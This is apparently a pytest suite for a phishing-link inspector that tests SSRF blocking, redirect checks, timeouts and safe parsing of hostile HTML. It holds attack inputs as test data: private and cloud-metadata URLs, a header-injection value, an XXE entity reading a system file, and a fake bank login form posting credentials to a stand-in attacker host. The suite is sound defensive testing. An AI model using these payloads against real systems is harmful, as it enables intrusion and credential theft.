import gzip
import http.server
import socket
import threading
import time

import pytest

import landing_page as lp
import store
from test_selection import client

H = {'X-Requested-With': 'Email-Threat-Detection'}


# ---------- SSRF boundary ----------
@pytest.mark.parametrize('url', [
    'http://127.0.0.1/', 'http://localhost/', 'http://10.0.0.5/', 'http://192.168.1.1/admin', 'http://172.16.0.1/',
    'http://169.254.169.254/latest/meta-data/', 'http://[::1]/', 'http://[::ffff:127.0.0.1]/', 'http://100.64.0.1/',
    'http://0.0.0.0/', 'http://[fe80::1]/', 'http://[fd00::1]/', 'http://[64:ff9b::7f00:1]/', 'http://[2002:7f00:1::]/',
    'http://224.0.0.1/', 'http://2130706433/',
])
def test_non_public_hosts_are_refused(url):
    result = lp.inspect(url)
    assert result['status'] == 'blocked', url
    assert 'non-public' in result['reason'] or 'resolved' in result['reason'] or 'Port' in result['reason']


@pytest.mark.parametrize('url,fragment', [
    ('file:///etc/passwd', 'Only http and https'), ('ftp://example.com/', 'Only http and https'), ('javascript:alert(1)', 'Only http and https'),
    ('gopher://example.com/', 'Only http and https'), ('http://user:pw@example.com/', 'embedded credentials'), ('http://a@example.com/', 'embedded credentials'),
    ('http://example.com:22/', 'not allowed'), ('http://example.com:3306/', 'not allowed'), ('http:///nohost', 'no host'),
    ('http://example.com/\r\nHost: evil', 'control characters'), ('', 'Only http and https'), ('http://' + 'a' * 3000, 'too long'),
])
def test_url_shape_is_validated(url, fragment):
    result = lp.inspect(url)
    assert result['status'] == 'blocked' and fragment in result['reason']


def test_non_string_input_never_raises():
    for bad in (None, 123, b'http://x', ['http://x']):
        assert lp.inspect(bad)['status'] == 'blocked'


def test_a_hostname_that_resolves_to_a_private_address_is_refused(monkeypatch):
    monkeypatch.setattr(lp.socket, 'getaddrinfo', lambda *a, **k: [(2, 1, 6, '', ('10.1.2.3', 80))])
    assert lp.inspect('http://innocent-looking.example/')['status'] == 'blocked'
    # one bad address among several is enough to refuse (split-horizon / multi-A tricks)
    monkeypatch.setattr(lp.socket, 'getaddrinfo', lambda *a, **k: [(2, 1, 6, '', ('93.184.216.34', 80)), (2, 1, 6, '', ('127.0.0.1', 80))])
    assert lp.inspect('http://mixed.example/')['status'] == 'blocked'


def test_connection_is_pinned_to_the_validated_address_not_re_resolved(monkeypatch):
    calls = []
    monkeypatch.setattr(lp.socket, 'getaddrinfo', lambda *a, **k: [(2, 1, 6, '', ('93.184.216.34', 80))])

    def fake_connect(address, timeout=None, *a, **k):
        calls.append(address)
        raise ConnectionRefusedError('stop here')
    monkeypatch.setattr(lp.socket, 'create_connection', fake_connect)
    result = lp.inspect('http://rebind.example/')
    assert calls == [('93.184.216.34', 80)]          # connected to the IP that was validated, never to the hostname
    assert result['status'] == 'error'


def test_every_redirect_hop_is_revalidated(monkeypatch):
    resolved = {'start.example': '93.184.216.34'}

    def fake_resolve(host, port):
        if host in resolved:
            return resolved[host]
        raise lp.Blocked(f'Host resolves to a non-public address ({host}); refused to prevent server-side request forgery.')
    monkeypatch.setattr(lp, '_resolve', fake_resolve)
    monkeypatch.setattr(lp, '_get', lambda parts, host, port, ip, deadline: (302, {'location': 'http://169.254.169.254/latest/meta-data/'}, b'', False))
    result = lp.inspect('http://start.example/')
    assert result['status'] == 'blocked' and 'non-public' in result['reason'] and result['redirects'] == ['http://169.254.169.254/latest/meta-data/']


def test_redirect_loop_is_capped_and_relative_redirects_work(monkeypatch):
    monkeypatch.setattr(lp, '_resolve', lambda host, port: '93.184.216.34')
    monkeypatch.setattr(lp, '_get', lambda parts, host, port, ip, deadline: (301, {'location': '/again'}, b'', False))
    result = lp.inspect('http://loop.example/')
    assert result['status'] == 'blocked' and 'redirects' in result['reason'] and len(result['redirects']) == lp.MAX_REDIRECTS
    assert result['redirects'][0] == 'http://loop.example/again'


def test_redirect_to_a_non_web_scheme_is_refused(monkeypatch):
    monkeypatch.setattr(lp, '_resolve', lambda host, port: '93.184.216.34')
    monkeypatch.setattr(lp, '_get', lambda parts, host, port, ip, deadline: (302, {'location': 'file:///etc/passwd'}, b'', False))
    assert lp.inspect('http://ok.example/')['status'] == 'blocked'


# ---------- real local HTTP server (private addresses allowed only inside these tests) ----------
PHISH = b'''<html><head><title>SBI Online Banking Login</title><meta http-equiv="refresh" content="30;url=http://elsewhere.example/">
</head><body><h1>Sign in</h1><form action="http://collector.evil-host.example/post" method="post"><input name="u"><input type="password" name="p">
<input type="hidden" name="t" value="1"></form><iframe src="http://x.example/"></iframe><script src="http://cdn.other.example/a.js"></script></body></html>'''


class _Handler(http.server.BaseHTTPRequestHandler):
    routes = {}

    def log_message(self, *a): pass

    def do_GET(self):
        status, headers, body = self.routes.get(self.path, (404, {}, b'nope'))
        self.send_response(status)
        for k, v in headers.items(): self.send_header(k, v)
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        if headers.get('X-Slow'): time.sleep(3)
        try: self.wfile.write(body)
        except OSError: pass


@pytest.fixture
def server(monkeypatch):
    monkeypatch.setattr(lp, 'ALLOW_PRIVATE', True)
    _Handler.routes = {}
    httpd = http.server.ThreadingHTTPServer(('127.0.0.1', 0), _Handler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    yield f'http://127.0.0.1:{httpd.server_address[1]}', _Handler.routes
    httpd.shutdown()
    httpd.server_close()


def test_credential_harvesting_page_is_described_without_executing_anything(server):
    base, routes = server
    routes['/login'] = (200, {'Content-Type': 'text/html; charset=utf-8'}, PHISH)
    result = lp.inspect(base + '/login')
    assert result['status'] == 'ok' and result['http_status'] == 200
    assert result['title'] == 'SBI Online Banking Login'
    titles = {f['title'] for f in result['findings']}
    assert {'Credential form', 'Password form over plain HTTP', 'Credential form submits to another domain', 'Meta refresh redirect',
            'Embedded frames', 'Page served from a bare IP address', 'Brand cue does not match the domain'} <= titles
    assert result['signals']['password_fields'] == 1 and result['signals']['scripts_external'] == 1
    assert result['forms'][0]['cross_domain_action'] is True and len(result['dom_hash']) == 64
    assert 'JavaScript' in result['scope'] and result['fetched_from_ip'] == '127.0.0.1'


def test_benign_page_has_no_findings(server):
    base, routes = server
    routes['/'] = (200, {'Content-Type': 'text/html'}, b'<html><head><title>Team lunch</title></head><body><p>Friday at noon.</p><a href="/x">menu</a></body></html>')
    result = lp.inspect(base + '/')
    assert result['status'] == 'ok' and result['signals']['forms'] == 0
    assert {f['title'] for f in result['findings']} <= {'Page served from a bare IP address'}   # the test server is at an IP; nothing else fires


def test_relative_redirect_is_followed_and_final_url_reported(server):
    base, routes = server
    routes['/start'] = (302, {'Location': '/final'}, b'')
    routes['/final'] = (200, {'Content-Type': 'text/html'}, b'<html><title>Landed</title></html>')
    result = lp.inspect(base + '/start')
    assert result['final_url'].endswith('/final') and result['title'] == 'Landed' and len(result['redirects']) == 1


def test_oversized_body_is_truncated_and_reported(server):
    base, routes = server
    routes['/big'] = (200, {'Content-Type': 'text/html'}, b'<html><title>Big</title><body>' + b'A' * (lp.MAX_BYTES + 5000) + b'</body></html>')
    result = lp.inspect(base + '/big')
    assert result['truncated'] is True and result['bytes_read'] == lp.MAX_BYTES
    assert 'Page truncated' in {f['title'] for f in result['findings']}


def test_non_html_and_compressed_responses_are_not_parsed(server):
    base, routes = server
    routes['/bin'] = (200, {'Content-Type': 'application/octet-stream'}, b'MZ\x90\x00 not html')
    assert 'Not an HTML page' in lp.inspect(base + '/bin')['note']
    routes['/gz'] = (200, {'Content-Type': 'text/html', 'Content-Encoding': 'gzip'}, gzip.compress(b'<html><title>x</title></html>' * 10))
    assert 'compression' in lp.inspect(base + '/gz')['note']


def test_slow_server_hits_the_time_budget(server, monkeypatch):
    base, routes = server
    monkeypatch.setattr(lp, 'TOTAL_TIMEOUT', 1.0)
    monkeypatch.setattr(lp, 'CONNECT_TIMEOUT', 1.0)
    routes['/slow'] = (200, {'Content-Type': 'text/html', 'X-Slow': '1'}, b'<html><title>slow</title></html>')
    started = time.monotonic()
    result = lp.inspect(base + '/slow')
    assert time.monotonic() - started < 2.5 and result['status'] == 'error'


def test_hostile_html_never_crashes_and_external_entities_are_not_loaded(server):
    base, routes = server
    routes['/xxe'] = (200, {'Content-Type': 'text/html'}, b'<!DOCTYPE x [<!ENTITY e SYSTEM "file:///C:/Windows/win.ini">]><html><title>&e;</title><body>&e;</body></html>')
    result = lp.inspect(base + '/xxe')
    assert result['status'] == 'ok' and 'for 16-bit app support' not in str(result) and '[fonts]' not in str(result)
    routes['/deep'] = (200, {'Content-Type': 'text/html'}, b'<html><body>' + b'<div>' * 5000 + b'x' * 10 + b'</div>' * 5000 + b'</body></html>')
    assert lp.inspect(base + '/deep')['status'] in ('ok', 'error')
    routes['/junk'] = (200, {'Content-Type': 'text/html'}, bytes(range(256)) * 50)
    assert lp.inspect(base + '/junk')['status'] in ('ok', 'error')


def test_connection_refused_is_an_error_not_a_crash(monkeypatch):
    monkeypatch.setattr(lp, 'ALLOW_PRIVATE', True)
    s = socket.socket(); s.bind(('127.0.0.1', 0)); port = s.getsockname()[1]; s.close()
    result = lp.inspect(f'http://127.0.0.1:{port}/')
    assert result['status'] == 'error' and 'Fetch failed' in result['reason']


# ---------- endpoint ----------
def _case(client):
    raw = ('From: a@b.example\r\nTo: c@d.example\r\nSubject: Verify\r\nContent-Type: text/plain\r\n\r\n'
           'Please verify at http://college-login.example/verify?redirect=https://secure-desk.example/session now.\r\n')
    return client.post('/api/analyze', json={'email': raw}, headers=H).json()


def test_endpoint_requires_confirmation_and_only_accepts_the_cases_own_links(client, monkeypatch):
    case = _case(client)
    url = next(u['url'] for u in case['urls'])
    monkeypatch.setattr(lp, 'inspect', lambda u: {'status': 'ok', 'final_url': u, 'findings': [], 'scope': lp.SCOPE})
    assert client.post(f"/api/cases/{case['id']}/urls/inspect", json={'url': url, 'confirm': False}, headers=H).status_code == 400
    assert client.post(f"/api/cases/{case['id']}/urls/inspect", json={'url': 'http://169.254.169.254/', 'confirm': True}, headers=H).status_code == 400
    assert client.post(f"/api/cases/{case['id']}/urls/inspect", json={'url': url, 'confirm': 'yes'}, headers=H).status_code == 422
    ok = client.post(f"/api/cases/{case['id']}/urls/inspect", json={'url': url, 'confirm': True}, headers=H)
    assert ok.status_code == 200 and ok.json()['status'] == 'ok'
    assert client.post('/api/cases/nonexistent/urls/inspect', json={'url': url, 'confirm': True}, headers=H).status_code == 404


def test_endpoint_writes_a_custody_event_and_respects_disable_flag_and_rate_limit(client, monkeypatch):
    case = _case(client)
    url = next(u['url'] for u in case['urls'])
    monkeypatch.setattr(lp, 'inspect', lambda u: {'status': 'blocked', 'reason': 'test', 'scope': lp.SCOPE})
    import main
    main.landing_hits.clear()
    for _ in range(6):
        assert client.post(f"/api/cases/{case['id']}/urls/inspect", json={'url': url, 'confirm': True}, headers=H).status_code == 200
    assert client.post(f"/api/cases/{case['id']}/urls/inspect", json={'url': url, 'confirm': True}, headers=H).status_code == 429
    events = store.case_events(main.store.session(client.cookies.get('efp_session'))[0], case['id'])
    assert [e['event']['action'] for e in events].count('landing_inspect') == 6
    main.landing_hits.clear()
    monkeypatch.setenv('LANDING_INSPECT_ENABLED', '0')
    assert client.post(f"/api/cases/{case['id']}/urls/inspect", json={'url': url, 'confirm': True}, headers=H).status_code == 403
    assert client.get(f"/api/cases/{case['id']}/export/evidence").status_code == 200


def test_scope_statement_reflects_whether_the_destination_was_contacted(server, monkeypatch):
    base, routes = server
    routes['/ok'] = (200, {'Content-Type': 'text/html'}, b'<html><title>x</title></html>')
    assert "destination saw this server's IP" in lp.inspect(base + '/ok')['scope']           # contacted -> honest warning
    monkeypatch.setattr(lp, 'ALLOW_PRIVATE', False)
    blocked = lp.inspect('http://169.254.169.254/latest/meta-data/')
    assert blocked['status'] == 'blocked' and 'No request was sent' in blocked['scope'] and 'saw this server' not in blocked['scope']
    # first hop contacted, then a redirect to a private address is refused: the destination DID see us
    def resolve(host, port):
        if host == 'start.example': return '93.184.216.34'
        raise lp.Blocked('Host resolves to a non-public address; refused to prevent server-side request forgery.')
    monkeypatch.setattr(lp, '_resolve', resolve)
    monkeypatch.setattr(lp, '_get', lambda *a: (302, {'location': 'http://169.254.169.254/'}, b'', False))
    mid = lp.inspect('http://start.example/')
    assert mid['status'] == 'blocked' and "saw this server's IP" in mid['scope']


class _DripHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.send_header('Content-Length', '100000')
        self.end_headers()
        try:
            for _ in range(200):                      # one byte every 0.3 s -> would take ~60 s to finish
                self.wfile.write(b'x'); self.wfile.flush(); time.sleep(0.3)
        except OSError:
            pass


def test_a_slow_drip_server_cannot_hold_the_worker_past_the_time_budget(monkeypatch):
    monkeypatch.setattr(lp, 'ALLOW_PRIVATE', True)
    monkeypatch.setattr(lp, 'TOTAL_TIMEOUT', 1.5)
    httpd = http.server.ThreadingHTTPServer(('127.0.0.1', 0), _DripHandler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    try:
        started = time.monotonic()
        result = lp.inspect(f'http://127.0.0.1:{httpd.server_address[1]}/')
        elapsed = time.monotonic() - started
        assert elapsed < 4.0, elapsed                         # bounded by the budget, not by the drip rate
        assert result['status'] == 'error' and 'Fetch failed' in result['reason']
    finally:
        httpd.shutdown(); httpd.server_close()


def test_internationalised_hosts_are_encoded_and_bad_ones_refused():
    assert lp.inspect('http://\u0000bad.example/')['status'] == 'blocked'
    parts, host, port = lp._validate_url('http://b\u00fccher.example/path')
    assert host == 'xn--bcher-kva.example' and port == 80
